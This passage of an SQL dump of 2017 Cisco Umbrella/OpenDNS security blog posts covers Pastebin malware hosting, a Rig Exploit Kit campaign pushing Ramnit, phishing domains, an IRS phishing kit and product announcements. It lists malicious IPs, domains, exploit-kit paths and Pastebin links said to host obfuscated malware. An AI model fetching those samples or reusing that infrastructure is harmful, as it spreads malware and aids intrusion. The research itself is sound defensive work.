popularity:\nbhphotovideo.com\ngooglegroups.com\ntravelocity.com\nsalesforce.com\nhollisterco.com\ntumblr.com\nweebly.com\nicloud.com\nblogspot.com\noffice365.com\neventbrite.com\napple.com\nConclusion\nThis attack used a common approach to target users accounts in an unsuspecting way and had a staggering impact.

Enigma is a 3-day conference that focuses on threats and defenses in the growing intersection of society and technology. There were a great number of fascinating talks and opportunities to network with the security community. We also gave a talk on “Behaviors and Patterns of Bulletproof and Anonymous Hosting Providers”: research that Dhia Mahjoub and Sarah Brown had been working on for several months.\n\n\nHere are some insights from those who attended.\nINSIGHTS FROM AUSTIN MCBRIDE\nOverall, I found Enigma to incorporate an excellent blend of technical and high-level presentations with ample time for Q&A sessions and a healthy dose of intermissions to socialize with colleagues. Enigma’s reputation for providing a premier level of quality talks was exemplified through its various speakers, who are experts and leaders in the public sector, academia, and industry, including our own Dhia Mahjoub.\nOne of the most compelling presentations was Matt Jones’ session on reducing spam in WhatsApp while implementing e2e messaging encryption for 1 billion users – this illustrated the immense power of user metadata in tracking and blocking abusers of the platform. Content is important – no arguments there – but metadata serves as a ripe treasure trove for researchers to sculpt algorithms aimed to block spam and/or malicious content.\nAnother interesting, albeit frightening, presentation was Yongdae Kim’s hacking sensors session where he demonstrated that spoofing, disrupting, and blocking sensor data was relatively easy. A basic understanding of a device’s internal components, coupled with a simple over-the-counter piece of hardware such as an infrared laser or speaker, can empower a nefarious person to cause serious damage to institutions and other individuals. The most interesting segment of Kim’s presentation occurred when he used an external speaker plugged into his laptop to disrupt a drone’s gyroscope and caused it to crash in the auditorium – theatrical, but point taken.\nINSIGHTS FROM SARAH BROWN\nOne of Sarah’s favorite aspects of Enigma is the requirement for all speakers to work with their session chair and colleagues in the session to give three practice talks in advance of the conference. The emphasis on speaker training comes from the TEDx conference approach, where speaker coaches are provided to all presenters, to ensure succinct, high quality talks and accessibility to the audience. This requirement had clear benefits during the event. The conference contained one excellent talk after another, with a clear desire from the speakers to connect with their audience.\nHighlights included:\nSusan Mernit (Hack-the-Hood) on cyber security and IT education for underprivileged San Francisco youth. http://www.hackthehood.org/\n     Yongdae Kim (Professor, Korea Advanced Institute of Science and Technology (KAIST) on IoT sensor attacks\n     Hudson Thrift (Uber) on engaging with early stage startups to bring new product features, and cause slight roadmap pivots, to address Uber’s security needs\n    Tom Lowenthal (Committee to Protect Journalists) work to support journalists across the world.\n     Daniela Oliveira (University of Florida) on the susceptibility of older adults to spear-fishing emails.\n     Nathaniel Gleicher (Illumio) on methods used by the US secret service to physically protect their key asset (the president) in their service environment (public places where the president speaks).\n     Matt Jones (WhatsApp) on preventing spam without access to message content\n     Damian Menscher (Google) on metrics and recovery against DDoS attacks at Google.\n     Ian Levy (UK NCSC) on the UK’s new central organization for all things cyber security in the UK.\nBEHAVIORS AND PATTERNS OF BULLETPROOF AND ANONYMOUS HOSTING PROVIDERS\nOur talk at Enigma was about bulletproof hosting patterns in the Netherlands and it showcased the joint research between Dhia and Sarah.\n\nThe premise of the talk was that there are legit needs for hosting providers as they offer outsourced IT services to ordinary businesses, but for all the legitimate uses, abuse of hosting providers is widespread. This abuse is significant, despite efforts from registrars, LE, and researchers to combat the problem. The challenge is similar to ideas like: criminals abuse encryption, but we cannot get rid of encryption. How do we manage it?\nWe approached our research from both a technical perspective and a field intelligence perspective, using large scale network data mining, OSINT research, and on the ground HUMINT investigative work. We came away with investigative analysis to understand how these hosting providers operate and what can be done to fight against them more effectively.\nAs a use case, we focused on the Dutch IP space and its use/abuse for bulletproof hosting and anonymous offshore hosting. The Netherlands is a great use case from a technical and cultural perspective because:\nNL is one of the top internet transit and hosting countries with an advanced infrastructure and the presence of major internet exchange points for the European and global internet.\n     NL IP space has been abused for distributing malware, sending spam as well as hosting of phishing sites, illegal hacker forums, stolen credentials dump shops and other toxic content.\n     NL places a high value for privacy, tech/IT\n     NL places a high value on entrepreneurs/small businesses\nThe talk combined the long-standing technical experience we have at Cisco Umbrella in investigating bulletproof hosting [1] [2] [3] [4] [5] [6] with interviews we conducted with local law enforcement, lawyers and subject matter experts. We supplemented that with OSINT research using social networks, government records, and open web information. As a result, we were able to provide a technical overview of detection methods of bulletproof hosting, identified patterns and behaviors as well as a synthesis of the legal climate, processes for reporting abuse and take downs and we concluded with some promising perspectives for the future.\n\n\n\nThe videos and decks for all the talks have been posted and can be found here: https://www.usenix.org/conference/enigma2017/conference-program', 'DNS;Events;Labs Research;Security Research', 'https://umbrella.cisco.com/blog/2017/04/24/enigma-2017-recap/');

Often chosen because they would preserve formatting, pastebins were also an attractive option for IRC enthusiasts who wanted to talk about problems they were having with their programs without flooding channels with irrelevant information. 14 years ago, Pastebin (pastebin.com) was created. Created to be a global repository for code review, the site has blossomed into one of the most popular sites on the net. As of this writing, Alexa’s global rank for it was 1,100.\nLike so many other things on the internet however, Pastebin has been abused by malicious actors. Taking advantage of the anonymity and specificity that Pastebin prides itself on, malware authors and hacker groups use the site for a variety of purposes, including sharing stolen login credentials and credit card information, kits for compromised sites, and most recently to host malware samples and complete malware chains. The site’s status as a data dump is well known, so let’s look at some of its other uses.\nHow To Compromise Websites and Influence People\nThe vast majority of content on Pastebin is benign. Plenty of users share legitimate snippets of code on it, everything from router firmware to online shopping carts. Though there’s plenty of other content that has little to do with computing or computer code, most of what is on Pastebin are pieces of scripts or programs, shared with the intention of helping anyone who needs it. The shadier side of Pastebin is still interested in helping people, but it’s more interested in helping people abuse vulnerabilities and compromised websites.\nHacker groups will use Pastebin to share their defacing code. IndoXploit, a hacking group operating for at least a year, hosts a good deal of their scripts under the Pastebin user account named “Tu5 b0l3d”, presumably the same user on the IndoXploit forums and YouTube channel.\nThe Pastebin account of “Tu5 b0l3d”, a member of the INdoXploit team\nNot all groups are so brazen, but the need to share is compelling all the same. Here, we see the PHP for a r57/c99 shell hidden behind an anonymous account:\nc99 shell on Pastebin\nc99 shells are for use by malicious actors when they’ve compromised a domain’s server. Acting as a backdoor, a c99 shell lets malicious users navigate the compromised domain, grants file and password access, and comes with a host of other tools.\nc99 shell distributed on Pastebin\n\nUmbrella Investigate graph for r57c99[.]com\nHidden in Plain Sight\nBeyond offering compromising scripts and compromised accounts, Pastebin has recently become a vector for malware attacks itself. Malware authors are using the site to host obfuscated code samples, usually encoded in Base64 (https://pastebin.com/nxd1fahr), but we’ve also seen examples in binary (https://pastebin.com/h3YpJvwp) as well as hex (https://pastebin.com/3J4EvhtL). These obfuscated samples are called by compromised websites in order to complete the kill chain: When a user accesses the compromised site, the site quietly makes a request to specific Pastebin URLs which then execute. The victim doesn’t need a Pastebin login (or even to know what Pastebin is), and the pastes can be set to remove themselves after a given amount of time. The small URLs pastebins employ in order to make sharing easier adds another problem for security professionals by making Twitter a particularly effective medium for infection and propagation. Used to distribute commands and code, the social media platform becomes another tool bent towards malicious purposes.\nBecause of the website’s popularity and ease of use, tens of thousands of pastes are added per day. Administrators might be hesitant to block the domain because of its utility, but malicious actors have been abusing it for years. The earliest blogs about this technique are two years old, and similar services such as Github’s Gist or Ideone are just as vulnerable to the underlying problems. Any service in which anonymous users can host code indefinitely is going to be a double-edged sword, and one that security professionals must be mindful of allowing.', 'Blog;Malware;Threat Discovery', 'https://umbrella.cisco.com/blog/2017/04/14/wretched-bin-scum-villainy/');

Healthcare IT professionals need to overcome a mounting list of security challenges: unmanaged consumer endpoints, ever-changing regulatory landscape, uptick in smart medical devices and an increased use of Wi-Fi networks in hospitals and healthcare facilities. Cloud-delivered security provides faster deployment with an open, automated way to reduce risk, simplify management and control costs.\nHealthcare industry expenditures on cloud computing will experience a compound annual growth rate of more than 20% by 2020.1 The industry has quickly transitioned from being hesitant about the cloud to embracing the technology for its overwhelming benefits.\nGeorge Washington University, a world-renowned research university, turned to Umbrella to protect its most important asset: the global reputation as a research leader.\n“We chose Cisco Umbrella because it offered a really high level of protection for our various different user bases, with a really low level of interaction required to implement the solution, so we could start blocking attacks and begin saving IR analyst time immediately,” said Mike Glyer, Director, Enterprise Security & Architecture.\n\nCustomers love Umbrella because it is a cloud-delivered platform that protects users both on and off the network. It stops threats over all ports and protocols for the most comprehensive coverage. Plus, Umbrella’s powerful, effective security does not require the typical operational complexity. By performing everything in the cloud, there is no hardware to install, and no software to manually update. The service is a scalable solution for large healthcare organizations with multiple locations, like The University of Kansas Hospital, ranked among the nation’s best hospitals every year since 2007 by U.S. News & World Report.\n“Like every hospital, we prioritize the protection of sensitive patient data against malware and other threats. We have to safeguard all network connected medical devices, as a compromise could literally result in a life-or-death situation,” says hospital Infrastructure Security Manager Henry Duong. “Unlike non-academic hospitals, however, our entwinement with medical school and research facility networks means we must also protect a lot sensitive research data and intellectual Property.”\nLike many healthcare providers, The University of Kansas Hospital would spend a lot time combing through gigabytes of logs trying to trace infections, point of origin and identify which machines were calling out.  The team turned to Cisco Umbrella for help.\n“First we just pointed our external DNS requests to Cisco Umbrella’s global network, which netted enough information to prompt an instant ‘Wow, we have to have this!’ response,” Duong says. “When our Umbrella trial began, we saw an immediate return, which I was able to document using Umbrella reporting and share with executive stakeholders. Those numbers, which ultimately led to executive buy-in, spoke volumes about the instant effect Umbrella had on our network.”\nThis overwhelming success led the team to later purchase Umbrella Investigate.\n“We suddenly went from struggling to track attacks to being able to correlate users with events and trace every click of their online travels. Then, Cisco Umbrella Investigate gave us the power to understand each threat’s entire story from start to finish,” Duong says. “We’re able to dig deep into the analysis to see what users are doing, where they’re going, and pinpoint any contributing behaviors so we can mitigate most efficiently.”\nWith impacts like these, isn’t it time you start a free trial today and see what impact Cisco Umbrella can do for on your organization?

New websites are created everyday, new articles are shared through blogs or social media, fresh data is served through APIs, emerging threats are repeatedly setup behind bulletproof and ephemeral infrastructures. Monitoring these online activities is part of the daily job of any security researcher and using the appropriate tools is key to keep the amount of investigation work manageable.\nAt OpenDNS labs, we have been building and using our own custom tools to perform these operations. Today, we are excited to share with you our homemade web crawler / data aggregator called OG-Miner. OG stands for OpenDNS Graph or Open Graphiti (or even Original Gangsta :p ). It is one of our main internal projects and acts as a central part of many analysis and backend processes.\nFind it on github at\nhttps://github.com/opendns/og-miner\n(Documentation available there).\nAbout\nA little bit of backstory, when we first started working on the OG-Miner several key design features needed to be considered. First of all we were sitting at the top of a huge knowledge base – our “OpenDNS Security Graph” – built from our authoritative and recursive DNS logs. Each piece of data can be accessed through our powerful Investigate API and allows security researchers to retrieve network metrics and features coming from our statistical models. At some point it became clear to us that we had to step back and start studying the topology of the connections built by our algorithms and therefore work with local graphs inside this immense Security Graph. We had to start mining our API data to understand its intrinsic structure.\nWe quickly realized that one of the most practical and simplest ways to crawl our graph data was to implement a customizable Breadth First Traversal. Even if you’re not familiar with graph theory the intuition is pretty straightforward: you start from a given vertex, you explore the neighbors of this node, the neighbors of the neighbors and so on… In essence you iterate on the graph by levels (i.e. depth).\nCombined with the adequate graph visualization tool (see OpenGraphiti at www.opengraphiti.com), the result was a multitude of beautiful new graph datasets we were eager to decrypt and analyze (Example below). Data visualization is certainly helpful for research but turned out to be a most interesting weapon for our engineering, sales, and marketing department. For the first time, explaining the true nature of our security data and statistical models was a transparent process.\nEx: Infrastructure graph extracted from opendns.com (orange node) with a depth of 3\n\n\nFor us this was a new perspective on our intelligence platform. But our data being mostly DNS-centric, the picture was not really complete without enriching our datasets with external APIs or libraries. There are plenty of other great data analytics out there and it would be a shame not to use them. This is the exact moment when we realized we had to go for a modular design to expand the mining capabilities or our tool. Indeed, you can integrate your own plugins to aggregate data, mine APIs or even apply any other sort of computation to your process (Ex: Local libraries, ML/Statistical models, Application monitoring etc.). The current default installation includes plugins for the OpenDNS Investigate API, VirusTotal, Shodan, MaxMind GeoIP, Selenium, HTTP, SSL, DNS and Whois and can very simply be extended.\nAfter experimenting and playing with various ideas, we came up with a couple of new fresh innovative detection models and our engine had to be scalable and automatable to fit in a large scale real-time data processing pipeline. We opted for several modern technologies such as ZeroMQ & MongoDB and implemented some graph processing cooperation logic. This way, we were able to build a cluster of graph miners (crawlers / aggregators / processors / explorers…) working in harmony on the same central persistent graph without running into any collision or synchronization issues.\n\nThese detection models have been running very well for a while now constantly finding and blocking freshly discovered domains. Our engine has reached maturity and we believe the security scene will greatly benefit from this new security tool.

This campaign has been discussed indirectly in other blog posts – we’d like to shed more information on its details.\nIn the Wild\nIn early February, 2017 our HitList classifier identified a redirection to a known Rig Exploit Kit Gate:\nhttp://forexo-click.info/flow2[.]php to new.admastersagency[.]com\nWe immediately blocked this domain, however, starting in March following a lull in the latter part of February, we’ve seen an increasing number of redirections to other known gates by systems hosted in the same ASNs: AS39134 and AS197695.\n\nThe majority of infections we’re seeing appear to be targeted towards Canada. This may be intended by the campaign or just be an unintended result of the distribution network. You’ll notice a number of references to Canada in the URI section below.\nLanding Page\nCommon in some Rig EK campaigns, an actor compromises a website to inject a malicious iframe which, unbeknownst to it’s visitors, fetches content from the exploit kit gate. The gate then profiles the user and delivers an exploit or some other malicious content.\nWhat makes this campaign slightly different is that the initial website (referred to here as a landing page, not to be confused with an EK landing page) which includes the iframe does not appear to be a compromised site. It looks to be in use for the sole purpose of delivering the iframe. This implies the campaign may be focused on malvertising or direct email links as a key method to drive traffic towards its sites. Malvertising also supports the observations in the prior report of this campaign mentioned above.\nThese landing pages follow a few common patterns, discussed in following sections.\nPage Content\nIt appears the campaign is testing the content of these landing pages. For instance, this example found on http://z-soft[.]biz/index1.php includes example code from bike guru and internet bad-boy, Sheldon Brown, but lacks the actual iframe src:\n\nWhile other sites are ready for production, such as this example from http://194.58.38[.]54/canadajapan.php:\n\nRoot Content\nThe root directories on some of the systems hosting landing pages include slightly more sophisticated JavaScript which grabs the timezone information from the user and posts it back to the PHP script before disclosing the gate. Here is an example from http://194.58.58[.]193/:\n\nA deobfuscated version of this same JavaScript shows that they may be using Google Analytics to track infections:\n\nIn response to this POST, the user will be redirected to the PHP script via JavaScript:\n\nWe saw cross-redirection between the two hosts, for example:\nhttp://194.58.58[.]193/ redirects to http://194.58.38[.]103/sploit/flow3.php\nhttp://194.58.38[.]103 redirects to http://194.58.38[.]103/sploit/flow3.php\nWhile http://194.58.58[.]193/index1.php lacks an iframe src.\niframe Structure\nThe iframe declaration is pretty white label – its positioned right after the center tag, includes zero’ed width, height and no frame border, plus the addition of the seamless attribute. This seamless attribute has been used in various exploit related content, even one instance involved in a notorious leak. However we haven’t seen it used in any recent campaigns, probably because its deprecated, which may imply this is a new effort by an old schooler or just someone who copied it from existing code.\nURIs\nWe’ve observed a few different permutations of the URI for these systems:\n/index1.php\n/sploit/index1.php\n/canadajapan.php\n/flowchina.php\n/sploit/flow336.php\n/china.php\n/sploit/flow2.php\n/sploit/flow3.php\n/usa.php\n/japan.php\n/flowrabit.php\n/flow77.php\nHosting Infrastructure\nMost of the systems found to be associated with the landing pages used by this campaign were all hosted in AS39134 and AS197695, owned by a Russian provider.\nWhile most activity was IP centric, the few domains involved also linked back to this provider. forexo-click[.]info, one of the first domains seen exhibiting these behavior, was registered a day before malicious traffic was set up on it.\n\nWe observed activity on the following systems:\n194.58.40[.]198\n194.58.58[.]193\n194.58.38[.]54\n194.58.38[.]51\nforexo-click[.]info\nz-soft[.]biz\nlexushireahero[.]com\nxn--15-mmc[.]xn--p1acf\nRegistrant\nPivoting off of the registrant for forexo-click[.]info, we came across z-soft[.]biz, which served what appeared to be a testing page containing the same landing page content without an iframe src target defined.\n\nInfection\nThe infection chain is what you’d expect from a Rig campaign:\n\n\nBefore the Flash object, the gate returns a page including a few strings between the script tags:\n\nThe exploit achieves code execution and transfers control to the following one liner which fetches an encoded binary and runs it:\n\nThe encoded binary is Ramnit, a well known banking trojan that has been grabbing headlines recently. We’ll continue to monitor the progress of this campaign and keep you up to date. In the meantime, if you have any additional information, please reach out to us (the authors of this post) on Twitter!

If I were to ask you to recall the IP address of dccomics.com in order to visit the website, chances are you wouldn’t know it. The IP would have no meaning to you. Domain names make surfing the Internet easy for us to get where we want to go. In our security research, domain names play a vital role. Often times, just by seeing a domain name one can easily narrow down the domains that may be malicious, parked, or used for phishing.\nFor instance, phishing domain names are made to look closely like banking sites or other popular brands in order to lure the user into entering their private credentials.\n\nAh! A classic Apple phishing page.\nWe see a lot of domains that are “parked” in our daily research. Parked domains are like placeholders waiting to serve content. You will typically see “Coming Soon” when visiting. At Cisco Umbrella, we may make the decision to block certain parked domains if they’re seen to host malicious links or redirects, or appear to be typo-squatting to phish users.\nRecently we had a set of domain names that at first glance, appeared to be a list of parked domain names. We pivoted through our information on these domains in order to learn more about their infrastructure.\n\nGETTING A CLOSER LOOK\nThe amount of queries as seen on our resolvers to one of these domains was fairly low:\nThis pattern would usually lead us to the conclusion that it was in fact only a parked domain name. However, things got a little more interesting when we saw the following subdomains:\nebumjae[.]twfzx[.]com\ncnhkyahootumbler[.]twfzx[.]com\nwww[.]cnhkyahootumbler[.]twfzx[.]com\nwww[.]3uwin[.]com\noutlook[.]3uwin[.]com\nfw[.]3uwin[.]com\nWhen a domain is parked and not hosting any content, it’s suspicious to see multiple subdomains with any notable query traffic. Some of these subdomains resemble DGAs.\nWHO? WHAT? WHERE?\nThese domains were all registered to email addresses with usernames consisting of random letters and numbers at the domain qq[.]com. Interestingly, the domains were all registered on the 21st – 26th of a given month. These were registered in September, February and November\n\nWe know that qq[.]com is a free hosting provider. Someone may have written a mechanism that creates e-mail accounts with random characters, which were used to register the domain names. The email addresses all differed and appeared random. The company’s name was the same for most.\n\nVIEWING THE CONTENT\nThe domains all contained content similar to the picture below:\n\nA few domains redirected to other websites with unfinished pages. The top banner image and domain name did not appear to have any relationship to the content displayed. It appears to be a template that isn’t interactive and only hosted as a placeholder.\n\n\nAmong the list of domains registered to these email addresses, we found domain names that appear to be phishing for Apple credentials.\nos-ios[.]com\nmanagement-ios[.]com\nWhile the content displayed on these pages does not appear to have any relationship to the domain name and is not currently serving a phishing page, we suspect that the registrant is experimenting with page templates on these domains names and getting ready to launch a phishing campaign.\nWe’re staying vigilant by watching these domains, registrants, and overarching patterns to protect our customers from new badness.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1115, 'Visualizing Time-Dependent Graphs', 'David Rodriguez', 'March 21, 2017', 'Intro\nData-Ink Maximization – is the concept of making every keystroke count (including the delete character), popularized by Edward Tufte. One famous example of this is how he redesigned the scatterplot into what is known as a rugplot.\nSimplify, then minimize. Add lines, that’s key. So, let’s try visualizing time-dependent graphs with Tufte’s inspiration, with a twist. Let’s visualize rotating infrastructures. That is, let’s capture new hostnames (for example mail.google.com) that are resolving to a hosting IP from hour to hour.\nOne additional restriction is to find a solution using Matplotlib and NetworkX. Maybe we can write something quickly. Pasted below is source code to do this yourself.\nOne Hosting IP\nGiven two graphs of fictitious hosting IPs hosting hostnames at one hour, then the next, we can build a graph for each time. The challenge is to visualize the evolution. In other words, the challenge is to compare two graphs that are time-dependent.\nHere’s our simple answer: draw lines from one hour to the next. Draw a line from hosting IP A to A between the time windows. Below is an example of doing just this:\n\nFIGURE 1: Following hosting IP A from one hour to the next.\nWith the guideline following hosting IP A from hour to hour, we see the density of hostnames connected begin to vary. This variation is due to A resolving more hostnames in the second hour.\nFrom a security perspective, an increase in the number of hostnames resolving on a hosting IP may indicate malicious or unintended behavior. For example, if we assume a hosting IP resolves a constant number of hostnames from one hour to the next (obviously a huge assumption), the increase in the number of hostnames resolving may be due to an IP starting to host a series of Exploit kit [1] or phishing domains [2][3].\nMultiple Hosting IPs\nOur next example, just builds on the first by overlaying more lines. Notice, how the lines begin to convey a certain amount of information about the complexity and density of the clusters in the graph.\n\nFIGURE 2: Following hosting IPs: A,B,C,H,S from one hour to the next.\nBy increasing the number of guidelines we are now tracing multiple hosting IPs from one hour to the next. We can compare the density of the connected hostnames per hosting IP. In addition, we can begin to identify any connections from Hosting IP to hostname to Hosting IP.\nThat is, hosting IP A and H in the first hour had nothing in common while in the second hour they had two hostnames in common. With the guidelines we can quickly re-trace two time-dependent subgraphs and map their evolution.\nFrom a security perspective, if hosting IP A and H had something in common in both hours, the resulting grid-lines would have completed a rectangle, a cycle, between the two time-dependent graphs. In this case, they form a tree-like structure. What makes this interesting, is that while hosting IP A and H obviously have something in common in the later hour, it is not clear they did in the previous. With the grid-lines we recognize there might be evidence that the hostnames in the previous hour may be related.\nWe may therefore proceed, perhaps, from a known malicious hostname and begin to test whether other hostnames within the weakly drawn cluster (of the hostnames resolving to A and H) in the previous hour are also malicious.\nNext\nThe above example simply traced one, two, or three hosting IPs from one hour to the next. But notice, we could vary this. We could trace domains just as easily, or, a combination of users and domains.\nIf you’re interested in graph analytics on time-dependent graphs definitely check out this paper authored by folks at AmpLab, Databricks, and Uber.\nSource\nYou’ll want your data stored in files like g1.txt and g2.txt looking like this:\n{“domsuf”:”jriugrkbfdkjhg.com”,”client”:”D”,”count”:3}\n{“domsuf”:”jriugrkbfdkjhg.com”,”client”:”E”,”count”:3}\n{“domsuf”:”x0vr8wn.net”,”client”:”A”,”count”:3}\n{“domsuf”:”52mt2pm.org”,”client”:”A”,”count”:3}\nThen you can run:', 'Big Data;Labs Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2017/03/21/visualizing-time-dependent-graphs/');

My favorite. Right up there with DMV visits season and Jury Duty season, amirite? Of course I’m being sarcastic.\nTax season is one of the most complained about things that I hear around this time of year, from most people anyways. That being said, it’s also prime phishing time for preying on people’s fear of being audited and owing money. Even though Cisco Umbrella will protect you from most phishing attacks, it doesn’t hurt to be aware of such forthcomings. Every little bit helps when it comes to keeping your sensitive personal information safe.\nBelow are some details about a couple ongoing phishing campaigns. These campaigns are targeting people who files taxes and are a bit click-happy.\nLanding Page\nOpen your inbox, click on that IRS-looking related link. You might land here:\nExample of IRS phishing page\nLook familiar?\nYou might have filed taxes a dozen times, and think you can’t be fooled, but the figure above is a spoof. Did you notice? In fact, the figure above is just one of the typical phishing pages, out of hundreds, we block at OpenDNS.\nInformation acquired from landing pages, like the one above, can not only compromise just one account and one credit card but can lead to a full exposure of every single important account you may have a password on: financial, social media, etc.. This can be proved by looking into the phishing kit used in a recent campaign.\nPhishing kit\nDuring our investigation we were able to obtain the copy of the kit. It is PHP-based, fully automated phishing software that lets malicious authors generate phishing pages based on the visiting user. The kit is easy to customize, but it comes with a number of phishing pages ready to be used:\nPhishing kit files\nThe kit is designed to work via automated injections in the compromised domains. It utilizes the following techniques to block unwanted access and keep persistence:\nPHP scripts that dynamically check if the remote IP address is allowed to access the phishing pages\nOptions for targeting a specific IP range\nBlacklisting anti-phishing products and specific user-agents.\nEncrypting stolen data with AES 256\nThe kits seem to be modified, but has credentials of the original author:\nCreator of the kit\nA quick Google search for these found credentials reveals that these actors are not new to the phishing business. Campaigns carried out with the help of their products dates back to September of 2015.\nMost recent activity without surprise is a post on AlphaBay forum looking for spam vendor to drive traffic to the phishing pages.\nRecent forum activity\nCurrently, this kit is designed to harvest credentials from bank users and people filing taxes, and we can see that more and more options become available even for unskilled criminals.\nProtection\nHere are some tips that will hopefully keep your information safe and sound during tax season.\n\n1) Be wary of giving out info to an incoming caller, regardless of who they say they are. These voice phishing attacks (or “Vishing”, as they are sometimes called) tend to be an automated recording asking you to call a number and pay a fine “OR ELSE.” Even though most of them are recorded voices, don’t be surprised if you get an actual human pressuring you into handing over your social security number. In either case, looking up the number for your local IRS office and calling that number instead to settle your debt (or lack thereof) is a great way to assure that you’re not speaking to a phisher trying to outsmart you. It’s a process that only takes a few minutes, but could save you a lot of headaches.\nExample of IRS Phish in PhishTank – Full page can be viewed here.\n2) If you receive a link via email, always double-check the url before divulging any information. Webpage based phishes can generally be split up into two categories; Dedicated phishes and Compromised phishes. Dedicated phishes are when a URL looks slightly similar to the company it’s trying to pose as (so something like “cisc0umbre11a.co.uk” or “cisco.nxfneos.ru”). Compromised phishes are exactly what they sound like. It’s a site, not initially intended for phishing purposes, that’s been hacked and used to host a phishing page, generally without the knowledge of the site owner themselves. In any case, a quick observation of the URL that you’re visiting could end up saving you lots of time and money. If the URL looks suspicious or completely different from the company they’re claiming to represent, then CLOSE THE PAGE! Don’t enter any information. Figure out other means of contacting them.\n3) Be weary of typo’s in emails asking your for your personal information. This interesting fact seems to be fairly consistent with phishing emails. Poor grammar. I’ve been told in the past that it’s mostly done purposefully, seeing as the people who wouldn’t notice a typo would also be more likely to bite the phish bait and hand over whatever personal information is asked for – DON’T BE THAT PERSON! Most professional financial institutions wouldn’t send you an email with a typo in it. I mean, they shouldn’t. You would think that if they wanted to be taken seriously, they wouldn’t be haphazard with their grammar, but I digress. If anything strange about the wording in an email jumps out at you, it’s probably a good idea to take a closer look.\nCisco Umbrella utilizes community moderated source Phishtank and power of OpenDNS Natural Language Processing(NLP) rank classifier to protect our users. We sincerely hope that this information saves you from getting phished. Your alertness and awareness of phishing attacks is just about the best tool you can have against these attackers, and utilizing these tips alone could save you from adding more funds to the phishers’ wallets.', 'Community;Labs Research;Machine Learning;Phishing;Threat Discovery', 'https://umbrella.cisco.com/blog/2017/03/13/phishing-eternal-revenue-cervezas/');

We can also see that the amount of phishing attacks against bitcoin users keeps increasing.

Both domains were registered on February 21, 2017, and went live on February 24th, getting over 200k DNS queries in a couple of hours.

But have you ever tried?\nI know, I know, you didn’t come here for canine training tips. Stay with me, there’s a point to all this. Anyways, it’s super hard. I tried, and all the dog wanted to do was sleep. Your best bet? You guessed it — getting a new dog.\nThe same thing was happening in security. New problems were arising — more roaming workers, apps and infrastructure moving to the cloud, and branch offices connecting directly to the internet — and the old tricks weren’t cutting it.\nEnter new dog\nToday, we’re excited to announce Cisco Umbrella, the industry’s first Secure Internet Gateway (SIG) in the cloud. What is a SIG, you ask? Good question. A SIG provides safe access to the internet anywhere users go, even when they are off the VPN. Before you connect to any destination, a SIG acts as your secure onramp to the internet and provides the first line of defense and inspection. Regardless of where users are located or what they’re trying to connect to, traffic goes through the SIG first. Once the traffic gets to the SIG cloud platform, there are different types of inspection and policy enforcement that can happen.\n\nYou’re probably thinking “Hey! that sounds like the stuff you guys have been doing for years!” and you’re not entirely wrong. We’ve taken the functionality and proven platform from OpenDNS and used it as the starting point for designing our SIG. But here’s where things get taken to a new level. We’ve taken other technology from across the Cisco portfolio and reimagined how it could be integrated together in order to deliver an even broader range of coverage of malicious destinations and files and better intelligence, while maintaining and improving our openness and simplicity.\nStop more threats\nTo prevent more threats, we’ve added the ability to inspect files. Using a combination of AV engines and Cisco Advanced Malware Protection (AMP), Umbrella now inspects files that are attempted to be downloaded from risky domains — providing additional protection for your organization. Our intelligent proxy was also re-architected using microservices to automatically scale for even better performance.\nMaking our intelligence more intelligent\nWe know the bad guys will try new methods, so we are constantly tuning and developing new statistical models to help uncover attacks before they launch. We’ve added two more, including one that predicts domains that will be used in future spam campaigns, and one that automates the reverse engineering of domain generation algorithms (DGAs) to predict thousands of future malicious domains. We’ve created additional security categories to give organizations the flexibility to block potential threats sooner. And you can now create custom URL blacklists based on your local intelligence for more granular control and the ability to extend protection beyond your perimeter.\nKeep it simple, keep it open\nWe want every interaction between you and our technology to be intuitive, meaningful, and ultimately, a delight. We know some of your biggest needs in the Umbrella dashboard revolve around setting up policies, finding infected devices, and identifying security trends within your organization. We’re revamping our user interface to improve policy configuration and provide more extensive reporting options. We’re introducing a new policy wizard that dynamically updates depending on what type of policy you want to create or change. When you’re creating new policies, not only does it walk you through every step of the policy configuration with a simple question-based flow, but you can also use our policy tester before implementing to ensure it will be applied as you intended. For reporting, we’ve revamped the design to help you find key information faster and make reports easier to share. Now, it’s even easier to know what to focus on.\nSince day one, we’ve built Umbrella to be a product that integrates and works closely with all types of technologies and platforms — including security appliances, intelligence platforms or feeds, and custom, in-house tools. Now, Umbrella integrates with Cisco Wireless LAN Controllers to gain broad visibility and protection across your wireless environment. Additionally, Umbrella together with CloudLock offers discovery and control for use of SaaS apps.\nIf you’ve been with us awhile, we’re excited for you to experience all the new features and functionality we’re adding to Umbrella. If you’re new (welcome!), we encourage you to try Umbrella, and see first hand the power of simple and effective cloud security.\nFor more information on the Secure Internet Gateway product category, check out Brian Roddy’s blog at: blogs.cisco.com/security/cisco-umbrella-secure-internet-gateway.', 'Announcements;News;Umbrella', 'https://umbrella.cisco.com/blog/2017/02/09/introducingsig/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1121, 'Visualizing 2016’s Top Threats', 'Austin McBride and Brad Antoniewicz', 'February 8, 2017', '2016 brought us more traffic then ever and with that, we identified and protected our customers from a barrage of new attacks, threats, and actors. Understanding these evolutions are paramount to a strong defense. In this post we will visualize and summarize some of the biggest threats highlighted in the Cisco Annual Cybersecurity Report (ACR).\nTo create these visualizations, we selected a number of domains that we have tagged as the particular threat, then used the Investigate API  to pivot across co-occurring domains, IP addresses, file hashes, registrant information and other attributes to build a graph of their relationships. Finally we used OpenGraphiti to visualize these graphs and uncover their structure. The end result are the intriguing  visualizations below.\nRed nodes are known-blacklisted domains, gray nodes are often benign domains, green nodes are popular known good domains, orange are IP addresses, and blue nodes are file hashes. The pulses indicate DNS traffic between nodes. Nodes with rings around them are the seed domains we initially pivoted on. In some cases we may have chosen to recolor certain nodes in order to provide a more clear visualization, or to emphasize a particular relationship.\nLocky\n\nWithout a doubt, Locky was one of the noisiest threats of the past year. This commodity ransomware can be built and distributed by any ambitious tech-savvy criminal due to continued Ransomware as a Service (RaaS) offerings. Campaigns involving Locky often used Necurs to aggressively email its broad range of targets with attachments containing droppers or links to download sites. On one day in late 2016, one of our mailboxes saw Locky in one-third of all email it received. Throughout the year, attackers modified the file extension used after a file was encrypted, resulting in a number of mythology-inspired variants. Every week resulted in a new variant, until it reached meme level. The degradation of file extensions started on theme with Zepto, Odin, Thor, Aesir and Osiris but then plummeted quickly with extensions like ZZZZ 